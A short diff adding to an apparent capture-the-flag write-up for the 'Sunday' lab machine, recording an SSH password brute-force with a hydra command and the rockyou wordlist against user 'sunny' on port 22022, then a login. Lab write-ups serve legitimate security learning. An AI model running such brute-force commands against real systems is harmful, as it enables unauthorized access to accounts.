@@ -26,3 +26,8 @@ run these command and you will find appropriate users
 
 ![Sunday_finger_user](https://user-images.githubusercontent.com/55708909/91527570-a2a3ea80-e923-11ea-8177-96638e20536d.png)
 
+i brute force  sssh and found password sunday
+
+hydra -l sunny -P /usr/share/wordlists/rockyou.txt 10.10.10.76 ssh -s 22022
+
+logged into system.
